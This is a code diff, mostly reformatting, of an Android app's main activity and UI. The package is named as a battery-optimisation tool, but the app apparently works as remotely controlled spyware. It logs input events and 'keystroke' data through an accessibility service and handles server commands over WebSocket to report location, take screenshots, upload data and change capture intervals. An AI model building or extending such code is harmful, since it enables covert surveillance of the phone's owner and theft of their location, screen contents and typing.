@@ -40,6 +40,7 @@ import com.android.batteryoptimization.network.WebSocketManager
 import com.google.gson.JsonObject
 import com.android.batteryoptimization.ocr.api.IOcrService
 import com.android.batteryoptimization.ocr.api.OcrResult
+import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.map
@@ -52,7 +53,7 @@ import java.util.*
 class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        
+
         val prefs = getSharedPreferences("keystroke_prefs", Context.MODE_PRIVATE)
         if (!prefs.contains("app_started_time")) {
             prefs.edit().putLong("app_started_time", System.currentTimeMillis()).apply()
@@ -67,10 +68,17 @@ class MainActivity : ComponentActivity() {
             android.Manifest.permission.READ_PHONE_STATE
         )
         val permissionsToRequest = permissions.filter {
-            androidx.core.content.ContextCompat.checkSelfPermission(this, it) != android.content.pm.PackageManager.PERMISSION_GRANTED
+            androidx.core.content.ContextCompat.checkSelfPermission(
+                this,
+                it
+            ) != android.content.pm.PackageManager.PERMISSION_GRANTED
         }
         if (permissionsToRequest.isNotEmpty()) {
-            androidx.core.app.ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), 100)
+            androidx.core.app.ActivityCompat.requestPermissions(
+                this,
+                permissionsToRequest.toTypedArray(),
+                100
+            )
         }
 
         val repository = InputRepository.getInstance(applicationContext)
@@ -164,11 +172,11 @@ class MainActivity : ComponentActivity() {
         val repo = InputRepository.getInstance(applicationContext)
         when (command) {
             "report_location", "force_report_location" -> {
-                Thread {
-                    val location = AMapLocationHelper.getLocation(this)
+                CoroutineScope(Dispatchers.IO).launch {
+                    val location = AMapLocationHelper.getLocation(this@MainActivity)
                     val locPayload = com.google.gson.Gson().toJson(location)
-                    WebSocketManager.send("""{"command":"report_location","params":$locPayload}""")
-                }.start()
+                    WebSocketManager.send("""{"command":"upload_location","params":$locPayload}""")
+                }
             }
             "upload_data" -> {
                 kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
@@ -176,27 +184,35 @@ class MainActivity : ComponentActivity() {
                     Log.d("WebSocket", "Upload trigger result: $msg")
                 }
             }
+
             "report_enabled" -> {
                 // 服务器下发 data: {"reportEnabled": 0或1}
                 val reportEnabled = (data as? JsonObject)?.get("reportEnabled")?.asInt
                 if (reportEnabled != null) {
                     repo.setReportEnabled(reportEnabled == 1)
-                    Log.d("WebSocket", "数据上报开关: ${if (reportEnabled == 1) "开启" else "关闭"}")
+                    Log.d(
+                        "WebSocket",
+                        "数据上报开关: ${if (reportEnabled == 1) "开启" else "关闭"}"
+                    )
                 }
             }
+
             "take_screenshot" -> {
                 val intent = Intent(InputAccessibilityService.ACTION_TAKE_SCREENSHOT).apply {
                     setPackage(packageName)
                 }
                 sendBroadcast(intent)
             }
+
             "set_interval" -> {
                 // 服务器下发 data: {"interval": 秒}
                 val intervalSec = (data as? com.google.gson.JsonObject)?.get("interval")?.asLong
                 if (intervalSec != null && intervalSec > 0) {
                     val intervalMs = intervalSec * 1000
                     getSharedPreferences("keystroke_prefs", MODE_PRIVATE)
-                        .edit().putLong(InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, intervalMs).apply()
+                        .edit()
+                        .putLong(InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, intervalMs)
+                        .apply()
                     Log.d("WebSocket", "Interval set to ${intervalSec}s")
                 }
             }
@@ -224,18 +240,31 @@ fun AppScreen(
 
     fun startAutoScreenshot() {
         if (!isAccessibilityEnabledInSettings(context)) {
-            android.widget.Toast.makeText(context, "无障碍服务未开启，请先开启权限", android.widget.Toast.LENGTH_SHORT).show()
+            android.widget.Toast.makeText(
+                context,
+                "无障碍服务未开启，请先开启权限",
+                android.widget.Toast.LENGTH_SHORT
+            ).show()
             return
         }
         if (!isServiceInstanceReady()) {
-            android.widget.Toast.makeText(context, "服务正在连接中，请稍候…", android.widget.Toast.LENGTH_SHORT).show()
+            android.widget.Toast.makeText(
+                context,
+                "服务正在连接中，请稍候…",
+                android.widget.Toast.LENGTH_SHORT
+            ).show()
             return
         }
-        val intent = android.content.Intent(InputAccessibilityService.ACTION_TAKE_SCREENSHOT).apply {
-            setPackage(context.packageName)
-        }
+        val intent =
+            android.content.Intent(InputAccessibilityService.ACTION_TAKE_SCREENSHOT).apply {
+                setPackage(context.packageName)
+            }
         context.sendBroadcast(intent)
-        android.widget.Toast.makeText(context, "已发送测试截屏指令", android.widget.Toast.LENGTH_SHORT).show()
+        android.widget.Toast.makeText(
+            context,
+            "已发送测试截屏指令",
+            android.widget.Toast.LENGTH_SHORT
+        ).show()
     }
 
     // Update service status and data when returning to the app
@@ -284,10 +313,16 @@ fun AppScreen(
     var showIntervalDialog by remember { mutableStateOf(false) }
 
     // 当前截屏间隔（从 SharedPreferences 读取，默认 10s）
-    val intervalPrefs = context.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
-    var currentIntervalMs by remember { mutableLongStateOf(
-        intervalPrefs.getLong(InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, InputAccessibilityService.DEFAULT_SCREENSHOT_INTERVAL_MS)
-    ) }
+    val intervalPrefs =
+        context.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
+    var currentIntervalMs by remember {
+        mutableLongStateOf(
+            intervalPrefs.getLong(
+                InputAccessibilityService.KEY_SCREENSHOT_INTERVAL,
+                InputAccessibilityService.DEFAULT_SCREENSHOT_INTERVAL_MS
+            )
+        )
+    }
 
     // ── OCR 服务（经 DRouter 寻址，实现在独立 :ocr_module） ─────────
     val ocrService = remember { OcrServiceLocator.get() }
@@ -320,7 +355,11 @@ fun AppScreen(
                     BitmapFactory.decodeStream(input)
                 }?.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                 if (bitmap == null) {
-                    android.widget.Toast.makeText(context, "无法加载图片", android.widget.Toast.LENGTH_SHORT).show()
+                    android.widget.Toast.makeText(
+                        context,
+                        "无法加载图片",
+                        android.widget.Toast.LENGTH_SHORT
+                    ).show()
                     return@launch
                 }
 
@@ -330,7 +369,11 @@ fun AppScreen(
                     serviceEngine != null && serviceEngine.isReady -> serviceEngine
                     ocrService != null && isStandaloneReady -> ocrService
                     else -> {
-                        android.widget.Toast.makeText(context, "OCR 模块未集成或引擎尚未就绪", android.widget.Toast.LENGTH_SHORT).show()
+                        android.widget.Toast.makeText(
+                            context,
+                            "OCR 模块未集成或引擎尚未就绪",
+                            android.widget.Toast.LENGTH_SHORT
+                        ).show()
                         bitmap.recycle()
                         return@launch
                     }
@@ -339,7 +382,11 @@ fun AppScreen(
                 ocrTestResult = results
                 bitmap.recycle()
             } catch (e: Exception) {
-                android.widget.Toast.makeText(context, "OCR 测试失败: ${e.message}", android.widget.Toast.LENGTH_LONG).show()
+                android.widget.Toast.makeText(
+                    context,
+                    "OCR 测试失败: ${e.message}",
+                    android.widget.Toast.LENGTH_LONG
+                ).show()
             } finally {
                 isOcrRunning = false
             }
@@ -358,7 +405,12 @@ fun AppScreen(
                 ),
                 actions = {
                     TextButton(onClick = { showMenu = true }) {
-                        Text("更多", color = Color.White, fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
+                        Text(
+                            "更多",
+                            color = Color.White,
+                            fontSize = 16.sp,
+                            fontWeight = FontWeight.SemiBold
+                        )
                     }
                     DropdownMenu(
                         expanded = showMenu,
@@ -377,7 +429,11 @@ fun AppScreen(
                                 showMenu = false
                                 coroutineScope.launch {
                                     val (_, message) = repository.uploadData()
-                                    android.widget.Toast.makeText(context, message, android.widget.Toast.LENGTH_SHORT).show()
+                                    android.widget.Toast.makeText(
+                                        context,
+                                        message,
+                                        android.widget.Toast.LENGTH_SHORT
+                                    ).show()
                                 }
                             }
                         )
@@ -417,7 +473,12 @@ fun AppScreen(
                             }
                         )
                         DropdownMenuItem(
-                            text = { Text(if (isOcrRunning) "识别中…" else "测试OCR", fontSize = 16.sp) },
+                            text = {
+                                Text(
+                                    if (isOcrRunning) "识别中…" else "测试OCR",
+                                    fontSize = 16.sp
+                                )
+                            },
                             enabled = !isOcrRunning,
                             onClick = {
                                 showMenu = false
@@ -432,19 +493,34 @@ fun AppScreen(
                             }
                         )
                         DropdownMenuItem(
-                            text = { Text(if (isLocating) "定位中…" else "更新定位", fontSize = 16.sp) },
+                            text = {
+                                Text(
+                                    if (isLocating) "定位中…" else "更新定位",
+                                    fontSize = 16.sp
+                                )
+                            },
                             enabled = !isLocating,
                             onClick = {
                                 showMenu = false
                                 coroutineScope.launch {
                                     isLocating = true
-                                    android.widget.Toast.makeText(context, "正在开始高德定位，请稍候...", android.widget.Toast.LENGTH_SHORT).show()
+                                    android.widget.Toast.makeText(
+                                        context,
+                                        "正在开始高德定位，请稍候...",
+                                        android.widget.Toast.LENGTH_SHORT
+                                    ).show()
                                     try {
                                         val payload = repository.forceRefreshLocation()
-                                        val jsonStr = com.google.gson.GsonBuilder().setPrettyPrinting().create().toJson(payload)
+                                        val jsonStr =
+                                            com.google.gson.GsonBuilder().setPrettyPrinting()
+                                                .create().toJson(payload)
                                         locationDialogText = jsonStr
                                     } catch (e: Exception) {
-                                        android.widget.Toast.makeText(context, e.message ?: "定位失败", android.widget.Toast.LENGTH_LONG).show()
+                                        android.widget.Toast.makeText(
+                                            context,
+                                            e.message ?: "定位失败",
+                                            android.widget.Toast.LENGTH_LONG
+                                        ).show()
                                     } finally {
                                         isLocating = false
                                     }
@@ -466,7 +542,9 @@ fun AppScreen(
             Card(
                 onClick = onNavigateToInstructions,
                 colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.secondaryContainer),
-                modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp)
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(bottom = 12.dp)
             ) {
                 Row(
                     modifier = Modifier.padding(14.dp),
@@ -632,9 +710,12 @@ fun AppScreen(
                                 .fillMaxWidth()
                                 .clickable {
                                     currentIntervalMs = ms
-                                    intervalPrefs.edit().putLong(
-                                        InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, ms
-                                    ).apply()
+                                    intervalPrefs
+                                        .edit()
+                                        .putLong(
+                                            InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, ms
+                                        )
+                                        .apply()
                                     showIntervalDialog = false
                                 }
                                 .padding(vertical = 8.dp),
@@ -672,7 +753,7 @@ fun AppScreen(
             text = {
                 Text(
                     "检测到辅助功能权限未开启，应用无法正常工作。\n\n" +
-                    "App 被系统杀死后权限可能被回收，请重新开启。",
+                            "App 被系统杀死后权限可能被回收，请重新开启。",
                     fontSize = 15.sp
                 )
             },
@@ -709,7 +790,8 @@ fun EventItem(event: InputEvent) {
                 modifier = Modifier.fillMaxWidth(),
                 horizontalArrangement = Arrangement.SpaceBetween
             ) {
-                val displayName = if (!event.appName.isNullOrBlank()) event.appName else event.packageName
+                val displayName =
+                    if (!event.appName.isNullOrBlank()) event.appName else event.packageName
                 Text(
                     text = displayName,
                     fontSize = 14.sp,
